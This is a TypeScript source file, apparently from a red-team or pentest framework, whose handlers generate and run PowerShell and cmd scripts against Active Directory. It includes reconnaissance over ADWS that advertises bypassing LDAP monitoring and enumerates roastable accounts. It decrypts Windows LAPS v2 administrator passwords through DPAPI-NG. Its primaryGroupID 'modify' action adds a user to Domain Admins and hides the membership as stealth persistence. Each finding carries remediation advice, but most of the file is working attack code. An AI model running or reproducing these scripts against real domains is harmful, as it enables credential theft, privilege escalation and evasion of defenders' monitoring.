    $asrepRoastable = $users | Where-Object { $_.DoesNotRequirePreAuth -and $_.Enabled }
    Write-Output "[+] Total users: $($users.Count) (Enabled: $($enabledUsers.Count))"
    Write-Output "[+] Admin users (adminCount=1): $($adminUsers.Count)"
    foreach ($u in $adminUsers) { Write-Output "    $($u.SamAccountName) — LastLogon: $($u.LastLogonDate)" }
    Write-Output "[+] Kerberoastable (SPN + enabled): $($kerberoastable.Count)"
    foreach ($u in $kerberoastable) { Write-Output "    $($u.SamAccountName) — SPN: $($u.ServicePrincipalName -join ', ')" }
    Write-Output "[+] AS-REP Roastable: $($asrepRoastable.Count)"
    foreach ($u in $asrepRoastable) { Write-Output "    $($u.SamAccountName)" }
    Write-Output ""`
        : ""
    }

    ${
      scope === "all" || scope === "groups"
        ? `
    # Privileged Groups
    Write-Output "=== PRIVILEGED GROUPS (via ADWS) ==="
    $privGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Backup Operators","Account Operators","Server Operators","DnsAdmins","Cert Publishers","Key Admins","Enterprise Key Admins")
    foreach ($grp in $privGroups) {
        try {
            $members = Get-ADGroupMember $grp -Server $dcHost -ErrorAction SilentlyContinue
            if ($members) {
                Write-Output "[+] $grp ($($members.Count) members):"
                foreach ($m in $members) { Write-Output "    $($m.SamAccountName) ($($m.objectClass))" }
            }
        } catch {}
    }
    Write-Output ""`
        : ""
    }

    ${
      scope === "all" || scope === "computers"
        ? `
    # Computers
    Write-Output "=== COMPUTERS (via ADWS) ==="
    $computers = Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate,TrustedForDelegation,msDS-AllowedToDelegateTo -Server $dcHost
    $dcs = $computers | Where-Object { $_.DistinguishedName -match "OU=Domain Controllers" }
    $unconstrainedDeleg = $computers | Where-Object { $_.TrustedForDelegation -and $_.DistinguishedName -notmatch "OU=Domain Controllers" }
    Write-Output "[+] Total computers: $($computers.Count), Domain Controllers: $($dcs.Count)"
    if ($unconstrainedDeleg) {
        Write-Output "[!] Non-DC with unconstrained delegation: $($unconstrainedDeleg.Count)"
        foreach ($c in $unconstrainedDeleg) { Write-Output "    $($c.Name) — $($c.OperatingSystem)" }
    }
    Write-Output ""`
        : ""
    }

    ${
      scope === "all" || scope === "trusts"
        ? `
    # Trusts
    Write-Output "=== TRUSTS (via ADWS) ==="
    $trusts = Get-ADTrust -Filter * -Server $dcHost -ErrorAction SilentlyContinue
    foreach ($t in $trusts) {
        Write-Output "[+] Trust: $($t.Name) — Direction: $($t.Direction), Type: $($t.TrustType)"
        Write-Output "    SID Filtering: $($t.SIDFilteringQuarantined), Selective Auth: $($t.SelectiveAuthentication)"
        if (-not $t.SIDFilteringQuarantined) {
            Write-Output "    [!] SID Filtering DISABLED — cross-trust SID injection possible"
        }
    }
    Write-Output ""`
        : ""
    }

    ${
      scope === "all" || scope === "gpos"
        ? `
    # GPOs
    Write-Output "=== GPOs (via ADWS) ==="
    $gpos = Get-GPO -All -Server $dcHost -ErrorAction SilentlyContinue
    Write-Output "[+] Total GPOs: $($gpos.Count)"
    foreach ($g in $gpos) {
        Write-Output "    $($g.DisplayName) — Modified: $($g.ModificationTime)"
    }
    Write-Output ""`
        : ""
    }

    ${
      scope === "all" || scope === "acls"
        ? `
    # AdminSDHolder ACL
    Write-Output "=== AdminSDHolder ACL (via ADWS) ==="
    $domainDN = (Get-ADDomain -Server $dcHost).DistinguishedName
    $adminSDHolder = Get-ADObject "CN=AdminSDHolder,CN=System,$domainDN" -Properties nTSecurityDescriptor -Server $dcHost
    $acl = $adminSDHolder.nTSecurityDescriptor
    $rules = $acl.Access
    Write-Output "[+] AdminSDHolder ACEs: $($rules.Count)"
    foreach ($rule in $rules) {
        if ($rule.AccessControlType -eq "Allow" -and $rule.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner") {
            $identity = $rule.IdentityReference.Value
            Write-Output "    [!] DANGEROUS: $identity has $($rule.ActiveDirectoryRights)"
        }
    }
    Write-Output ""`
        : ""
    }
}

Write-Output "[+] ADWS reconnaissance complete"
Write-Output "    All queries sent via port 9389 — LDAP monitoring was BYPASSED"
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  findings.push({
    checkId: "WIN-ADWS-001",
    provider: "windows",
    severity: "informational",
    status: "ENUMERATED",
    resource: `adws://${server || "domain"}`,
    title: "AD enumeration completed via ADWS (LDAP bypassed)",
    details: "All reconnaissance performed via ADWS port 9389 — no LDAP queries generated",
    remediation: "Monitor ADWS port 9389 traffic. Enable Windows Event Forwarding for AD Web Services logs.",
  })

  return { output: output.join("\n"), findings }
}

export async function lapsV2Decrypt(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const computer = argVal(args, "--computer")
  const findings: Finding[] = []
  const output: string[] = ["[*] Windows LAPS v2 Encrypted Password Operations...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const cmds: string[] = []

    if (action === "enum") {
      cmds.push(
        `echo === LAPS V2 SCHEMA CHECK === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=msLAPS-EncryptedPassword)" -attr lDAPDisplayName 2>nul`,
      )
      cmds.push(
        `echo === LAPS V2 SCHEMA ATTRS === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(|(lDAPDisplayName=msLAPS-PasswordExpirationTime)(lDAPDisplayName=msLAPS-Password)(lDAPDisplayName=msLAPS-EncryptedPassword)(lDAPDisplayName=msLAPS-EncryptedDSRMPassword))" -attr lDAPDisplayName 2>nul`,
      )

      const compFilter = computer
        ? `-filter "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))"`
        : `-filter "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"`
      cmds.push(
        `echo === COMPUTERS WITH ENCRYPTED LAPS === && dsquery * -limit 0 ${compFilter} -attr cn dNSHostName operatingSystem msLAPS-PasswordExpirationTime 2>nul`,
      )

      cmds.push(
        `echo === UNENCRYPTED LAPS V2 (bonus) === && dsquery * -limit 0 -filter "(&(objectClass=computer)(msLAPS-Password=*))" -attr cn msLAPS-Password 2>nul`,
      )

      cmds.push(
        `echo === LAPS REGISTRY CONFIG === && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS\\State" 2>nul && reg query "HKLM\\SOFTWARE\\Microsoft\\Policies\\LAPS" 2>nul`,
      )
    } else {
      output.push("[!] DPAPI-NG decryption (NCryptUnprotectSecret) requires PowerShell")
      output.push("[*] cmd.exe cannot perform DPAPI-NG operations")
      output.push("[*] Alternatives:")
      output.push("    1. Use PowerShell mode: --exec ps")
      output.push("    2. Extract encrypted blob via dsquery and decrypt offline")
      output.push("    3. Use domain DPAPI backup key with dpapi_domain handler")

      if (computer) {
        cmds.push(
          `echo === ENCRYPTED BLOB INFO === && dsquery * -filter "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))" -attr cn msLAPS-EncryptedPassword 2>nul`,
        )
      }
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    if (action === "enum") {
      const hasResults = output.join("").includes("msLAPS-EncryptedPassword")
      if (hasResults) {
        findings.push({
          checkId: "WIN-LAPS2-001",
          provider: "windows",
          severity: "high",
          status: "ENUMERATED",
          resource: "laps://v2-encrypted",
          title: "Computers with Windows LAPS v2 encrypted passwords found",
          details: "Encrypted LAPS passwords found — decryptable with domain backup key or authorized principal",
          remediation: "Restrict LAPS password read permissions. Monitor msLAPS-EncryptedPassword attribute access.",
        })
      }
    }

    return { output: output.join("\n"), findings }
  }

  const script = `
$configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext

${
  action === "enum"
    ? `
Write-Output "[*] Enumerating Windows LAPS v2 (encrypted password) deployment..."

# Check schema for LAPS v2 attributes
$schemaSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Schema,CN=Configuration,$defaultNC"))
$lapsV2Attrs = @("msLAPS-PasswordExpirationTime", "msLAPS-Password", "msLAPS-EncryptedPassword", "msLAPS-EncryptedDSRMPassword", "msLAPS-EncryptedDSRMPasswordHistory")
$foundAttrs = @()
foreach ($attr in $lapsV2Attrs) {
    $schemaSearcher.Filter = "(lDAPDisplayName=$attr)"
    $result = $schemaSearcher.FindOne()
    if ($result) {
        $foundAttrs += $attr
        Write-Output "[+] Schema attribute found: $attr"
    }
}

if ($foundAttrs.Count -eq 0) {
    Write-Output "[-] Windows LAPS v2 schema not extended — LAPS v2 not deployed"
    exit 0
}

# Find computers with encrypted LAPS passwords
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
${computer ? `$searcher.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*)(cn=${computer}))"` : '$searcher.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"'}
$searcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","msLAPS-EncryptedPassword","msLAPS-PasswordExpirationTime","msLAPS-Password","operatingSystem"))
$computers = $searcher.FindAll()

Write-Output ""
Write-Output "[+] Computers with encrypted LAPS passwords: $($computers.Count)"
foreach ($comp in $computers) {
    $cn = $comp.Properties["cn"][0]
    $dns = $comp.Properties["dNSHostName"]
    $os = $comp.Properties["operatingSystem"]
    $expiry = $comp.Properties["msLAPS-PasswordExpirationTime"]

    Write-Output "    Computer: $cn"
    if ($dns.Count -gt 0) { Write-Output "    DNS: $($dns[0])" }
    if ($os.Count -gt 0) { Write-Output "    OS: $($os[0])" }
    if ($expiry.Count -gt 0) {
        $expiryDate = [DateTime]::FromFileTime([Int64]$expiry[0])
        Write-Output "    Password expires: $expiryDate"
        if ($expiryDate -lt (Get-Date)) {
            Write-Output "    [!] PASSWORD EXPIRED — may be rotated on next GP refresh"
        }
    }

    # Check for unencrypted password too
    $plainPw = $comp.Properties["msLAPS-Password"]
    if ($plainPw.Count -gt 0) {
        Write-Output "    [!] UNENCRYPTED password also present (use laps_dump to read)"
    }

    # Check encrypted password blob size
    $encPw = $comp.Properties["msLAPS-EncryptedPassword"]
    if ($encPw.Count -gt 0) {
        $blob = [byte[]]$encPw[0]
        Write-Output "    Encrypted blob size: $($blob.Length) bytes (DPAPI-NG encrypted)"
    }
    Write-Output ""
}

# Check who can read LAPS passwords
Write-Output "[*] Checking LAPS read permissions..."
$searcher2 = [System.DirectoryServices.DirectorySearcher]::new()
$searcher2.Filter = "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"
$first = $searcher2.FindOne()
if ($first) {
    $entry = $first.GetDirectoryEntry()
    $acl = $entry.ObjectSecurity
    $rules = $acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
    $lapsReaders = @()
    foreach ($rule in $rules) {
        if ($rule.AccessControlType -eq "Allow") {
            $propGuid = $rule.ObjectType.ToString()
            # msLAPS-EncryptedPassword property GUID
            if ($propGuid -eq "00000000-0000-0000-0000-000000000000" -or
                $rule.ActiveDirectoryRights -match "GenericAll|ReadProperty") {
                $lapsReaders += $rule.IdentityReference.Value
            }
        }
    }
    $lapsReaders = $lapsReaders | Select-Object -Unique
    Write-Output "[+] Principals that can read LAPS passwords:"
    foreach ($r in $lapsReaders) { Write-Output "    $r" }
}
`
    : `
Write-Output "[*] Attempting Windows LAPS v2 encrypted password decryption..."
${!computer ? 'Write-Output "[!] Required: --computer COMPUTER_NAME"; exit 1' : ""}

# Read the encrypted blob
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))"
$searcher.PropertiesToLoad.AddRange(@("cn","msLAPS-EncryptedPassword"))
$result = $searcher.FindOne()

if (-not $result) {
    Write-Output "[-] Computer '${computer}' not found or has no encrypted LAPS password"
    exit 1
}

$encBlob = [byte[]]($result.Properties["msLAPS-EncryptedPassword"][0])
Write-Output "[+] Encrypted blob retrieved: $($encBlob.Length) bytes"

# DPAPI-NG decryption via NCryptUnprotectSecret
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class DpapiNG {
    [DllImport("ncrypt.dll")]
    public static extern int NCryptUnprotectSecret(
        out IntPtr phDescriptor,
        uint dwFlags,
        byte[] pbProtectedBlob,
        uint cbProtectedBlob,
        IntPtr pMemPara,
        IntPtr hWnd,
        out IntPtr ppbData,
        out uint pcbData);

    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeBuffer(IntPtr pvInput);

    public const uint NCRYPT_SILENT_FLAG = 0x00000040;
}
"@

try {
    $hDesc = [IntPtr]::Zero
    $pData = [IntPtr]::Zero
    $cbData = [uint32]0

    # Skip the first 16 bytes (LAPS header: timestamp + flags)
    $dpapiBlob = New-Object byte[] ($encBlob.Length - 16)
    [Array]::Copy($encBlob, 16, $dpapiBlob, 0, $dpapiBlob.Length)

    $status = [DpapiNG]::NCryptUnprotectSecret(
        [ref]$hDesc, 0x40,
        $dpapiBlob, [uint32]$dpapiBlob.Length,
        [IntPtr]::Zero, [IntPtr]::Zero,
        [ref]$pData, [ref]$cbData)

    if ($status -eq 0 -and $pData -ne [IntPtr]::Zero) {
        $decrypted = New-Object byte[] $cbData
        [System.Runtime.InteropServices.Marshal]::Copy($pData, $decrypted, 0, [int]$cbData)
        [DpapiNG]::NCryptFreeBuffer($pData)

        $jsonStr = [System.Text.Encoding]::Unicode.GetString($decrypted)
        Write-Output "[+] DECRYPTED Windows LAPS v2 password for ${computer}:"
        Write-Output $jsonStr
    } else {
        Write-Output "[-] NCryptUnprotectSecret failed (HRESULT: 0x$($status.ToString('X8')))"
        Write-Output "    This usually means current user is not authorized to decrypt"
        Write-Output "    Requires: membership in the LAPS password readers group or Domain Admin"
        Write-Output "    Alternative: Extract domain DPAPI-NG backup key with dpapi_domain"
    }
} catch {
    Write-Output "[!] Decryption error: $($_.Exception.Message)"
}
`
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (action === "enum") {
    const countMatch = result.stdout.match(/encrypted LAPS passwords:\s*(\d+)/)
    const count = countMatch ? parseInt(countMatch[1]) : 0
    if (count > 0) {
      findings.push({
        checkId: "WIN-LAPS2-001",
        provider: "windows",
        severity: "high",
        status: "ENUMERATED",
        resource: "laps://v2-encrypted",
        title: `${count} computers with Windows LAPS v2 encrypted passwords`,
        details: "Encrypted LAPS passwords found — decryptable with domain backup key or authorized principal",
        remediation: "Restrict LAPS password read permissions. Monitor msLAPS-EncryptedPassword attribute access.",
      })
    }
  } else if (result.stdout.includes("DECRYPTED")) {
    findings.push({
      checkId: "WIN-LAPS2-002",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: `laps://${computer}`,
      title: `Windows LAPS v2 encrypted password decrypted for ${computer}`,
      details: "DPAPI-NG protected LAPS password successfully decrypted",
      remediation: "Rotate LAPS password immediately. Review LAPS read permissions.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function primaryGroupAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const target = argVal(args, "--target")
  const groupRid = argVal(args, "--group-rid") || "512"
  const findings: Finding[] = []
  const output: string[] = ["[*] Primary Group ID Manipulation...\n"]

  if (!target && action !== "check") return { output: "[!] Required: --target USER", findings }

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const cmds: string[] = []

    if (action === "check") {
      cmds.push(
        `echo === USERS WITH NON-DEFAULT PRIMARY GROUP === && dsquery * -filter "(&(objectCategory=person)(objectClass=user)(!primaryGroupID=513))" -attr sAMAccountName primaryGroupID adminCount -limit 0 2>nul`,
      )

      cmds.push(
        `echo === KNOWN GROUP RIDs === && echo 512 = Domain Admins && echo 513 = Domain Users && echo 514 = Domain Guests && echo 518 = Schema Admins && echo 519 = Enterprise Admins && echo 520 = Group Policy Creator Owners`,
      )

      if (target) {
        cmds.push(
          `echo === TARGET USER: ${target} === && net user ${target} /domain 2>nul && echo. && dsquery user -samid ${target} -attr primaryGroupID memberOf adminCount 2>nul`,
        )
      }

      if (exec === "wmic") {
        cmds.push(
          `echo === VIA WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user where "ds_primaryGroupID<>513" get ds_samaccountname,ds_primaryGroupID /format:list 2>nul`,
        )
      }
    } else if (action === "modify") {
      output.push("[!] primaryGroupID modification requires LDAP write access via PowerShell")
      output.push("[*] cmd.exe cannot set LDAP attributes directly")
      output.push("[*] Alternatives:")
      output.push(`    1. Use PowerShell mode: --exec ps`)
      output.push(`    2. Use ldifde to import LDIF with modified primaryGroupID:`)
      output.push(`       ldifde -i -f modify.ldf (where modify.ldf sets primaryGroupID: ${groupRid})`)
      output.push(`    3. Use dsmod user "DN" -memberof "GroupDN" then set primaryGroupID`)

      cmds.push(
        `echo === CURRENT USER INFO === && dsquery user -samid ${target} -attr distinguishedName primaryGroupID memberOf 2>nul`,
      )
    } else {
      cmds.push(`echo === REVERTING === && echo Revert via cmd requires ldifde or dsmod`)
      cmds.push(
        `echo === CURRENT STATE === && dsquery user -samid ${target} -attr distinguishedName primaryGroupID 2>nul`,
      )
      output.push("[*] To revert: Use PowerShell or ldifde -i -f revert.ldf (primaryGroupID: 513)")
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    if (action === "check" && output.join("").match(/primaryGroupID\s+(512|518|519)/)) {
      findings.push({
        checkId: "WIN-PGID-001",
        provider: "windows",
        severity: "high",
        status: "ENUMERATED",
        resource: "ad://primaryGroupID",
        title: "Users with hidden privileged group membership found",
        details: "Users with primaryGroupID set to privileged groups are invisible to 'net group' enumeration",
        remediation: "Audit primaryGroupID values across all users. Reset non-standard values to 513 (Domain Users).",
      })
    }

    return { output: output.join("\n"), findings }
  }

  const script = `
$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext

${
  action === "check"
    ? `
Write-Output "[*] Checking primaryGroupID usage across domain..."

# Well-known group RIDs
$groupNames = @{
    512 = "Domain Admins"
    513 = "Domain Users"
    514 = "Domain Guests"
    515 = "Domain Computers"
    516 = "Domain Controllers"
    518 = "Schema Admins"
    519 = "Enterprise Admins"
    520 = "Group Policy Creator Owners"
    521 = "Read-Only Domain Controllers"
    553 = "RAS and IAS Servers"
}

# Find users with non-default primaryGroupID
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
${target ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"` : '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!primaryGroupID=513))"'}
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","primaryGroupID","adminCount","memberOf"))
$results = $searcher.FindAll()

Write-Output "[+] Users with non-default primaryGroupID:"
$suspiciousCount = 0
foreach ($r in $results) {
    $sam = $r.Properties["sAMAccountName"][0]
    $pgid = [int]$r.Properties["primaryGroupID"][0]
    $groupName = if ($groupNames.ContainsKey($pgid)) { $groupNames[$pgid] } else { "RID $pgid" }
    $adminCount = $r.Properties["adminCount"]

    Write-Output "    $sam — primaryGroupID: $pgid ($groupName)"
    if ($adminCount.Count -gt 0 -and $adminCount[0] -eq 1) {
        Write-Output "        adminCount: 1 (protected by AdminSDHolder)"
    }

    # Check if this membership is "hidden" from net group
    if ($pgid -eq 512 -or $pgid -eq 519 -or $pgid -eq 518) {
        $suspiciousCount++
        Write-Output "        [!] STEALTH: This user is effectively a member of $groupName"
        Write-Output "            'net group \"$groupName\"' will NOT show this user"
        Write-Output "            Only LDAP query for primaryGroupID reveals this"
    }
}

if ($suspiciousCount -gt 0) {
    Write-Output ""
    Write-Output "[!] $suspiciousCount users have hidden privileged group membership via primaryGroupID"
} elseif ($results.Count -eq 0) {
    Write-Output "    (none found — all users have default primaryGroupID=513)"
}
`
    : action === "modify"
      ? `
Write-Output "[*] Modifying primaryGroupID for ${target || "unknown"}..."
${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}

$targetRid = ${groupRid}
$groupNames = @{ 512 = "Domain Admins"; 518 = "Schema Admins"; 519 = "Enterprise Admins" }
$groupName = if ($groupNames.ContainsKey($targetRid)) { $groupNames[$targetRid] } else { "RID $targetRid" }

# First, the user MUST be a member of the target group
# primaryGroupID can only be set to a group the user is already a member of
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"
$searcher.PropertiesToLoad.AddRange(@("distinguishedName","primaryGroupID","memberOf"))
$result = $searcher.FindOne()

if (-not $result) {
    Write-Output "[-] User '${target}' not found"
    exit 1
}

$userDN = $result.Properties["distinguishedName"][0]
$currentPGID = [int]$result.Properties["primaryGroupID"][0]
Write-Output "[+] Current primaryGroupID: $currentPGID"

# Check if user is member of target group
$groupSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$groupSearcher.Filter = "(&(objectClass=group)(objectSid=*$targetRid))"
# This is simplified — actual SID construction would be needed for proper matching

# Try to set primaryGroupID
try {
    $userEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$userDN")
    Write-Output "[*] Adding ${target} to $groupName first (required before primaryGroupID change)..."

    # Find the group DN
    $domainSid = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).AccountDomainSid
    $groupSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AccountDomainAdminsSid, $domainSid)

    $groupSearcher2 = [System.DirectoryServices.DirectorySearcher]::new()
    $groupSearcher2.Filter = "(&(objectClass=group)(objectSid=$($groupSid.Value)))"
    $groupResult = $groupSearcher2.FindOne()

    if ($groupResult) {
        $groupEntry = $groupResult.GetDirectoryEntry()
        try {
            $groupEntry.Add("LDAP://$userDN")
            $groupEntry.CommitChanges()
            Write-Output "[+] Added ${target} to group"
        } catch {
            Write-Output "[*] User may already be a member"
        }
    }

    # Now set primaryGroupID
    $userEntry.Put("primaryGroupID", $targetRid)
    $userEntry.SetInfo()
    Write-Output "[+] primaryGroupID set to $targetRid ($groupName)"
    Write-Output ""
    Write-Output "[+] STEALTH PERSISTENCE ESTABLISHED:"
    Write-Output "    ${target} is now effectively a $groupName member"
    Write-Output "    'net group \"$groupName\"' will NOT show ${target}"
    Write-Output "    Only LDAP: (primaryGroupID=$targetRid) reveals this membership"
    Write-Output "    Survives password resets and most AD cleanup scripts"
} catch {
    Write-Output "[!] Failed to set primaryGroupID: $($_.Exception.Message)"
    Write-Output "    Requires: WritePrimaryGroupID permission on the user object"
}
`
      : `
# Revert
Write-Output "[*] Reverting primaryGroupID to Domain Users (513)..."
${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}

$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=${target}))"
$result = $searcher.FindOne()
if (-not $result) { Write-Output "[-] User not found"; exit 1 }

$userDN = $result.Properties["distinguishedName"][0]
$currentPGID = [int]$result.Properties["primaryGroupID"][0]
Write-Output "[+] Current primaryGroupID: $currentPGID"

try {
    $userEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$userDN")
    $userEntry.Put("primaryGroupID", 513)
    $userEntry.SetInfo()
    Write-Output "[+] primaryGroupID reverted to 513 (Domain Users)"
} catch {
    Write-Output "[!] Failed: $($_.Exception.Message)"
}
`
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (action === "check") {
    const suspMatch = result.stdout.match(/(\d+) users have hidden/)
    if (suspMatch) {
      findings.push({
        checkId: "WIN-PGID-001",
        provider: "windows",
        severity: "high",
        status: "ENUMERATED",
        resource: "ad://primaryGroupID",
        title: `${suspMatch[1]} users with hidden privileged group membership`,
        details: "Users with primaryGroupID set to privileged groups are invisible to 'net group' enumeration",
        remediation: "Audit primaryGroupID values across all users. Reset non-standard values to 513 (Domain Users).",
      })
    }
  } else if (action === "modify" && result.stdout.includes("STEALTH PERSISTENCE")) {
    findings.push({
      checkId: "WIN-PGID-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `ad://${target}`,
      title: `primaryGroupID stealth persistence on ${target}`,
      details: `Set primaryGroupID to ${groupRid} — invisible to net group enumeration`,
      remediation: "Check primaryGroupID with LDAP query. Reset to 513 and audit who modified it.",
    })
  }

  return { output: output.join("\n"), findings }
}
